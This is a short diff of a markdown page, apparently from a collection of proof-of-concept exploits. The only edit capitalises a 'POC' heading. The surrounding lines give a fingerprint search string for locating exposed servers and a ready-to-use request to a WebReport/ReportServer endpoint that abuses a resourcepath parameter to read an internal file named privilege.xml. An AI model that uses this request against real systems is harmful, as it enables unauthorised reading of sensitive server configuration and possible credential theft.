@@ -8,7 +8,7 @@ body="isSupportForgetPwd"
 ![image](https://github.com/wy876/POC/assets/139549762/b38dbaa3-3103-45e7-980b-7f3adf6a95ba)
 
 
-## poc
+## POC
 ```
 WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
 ```
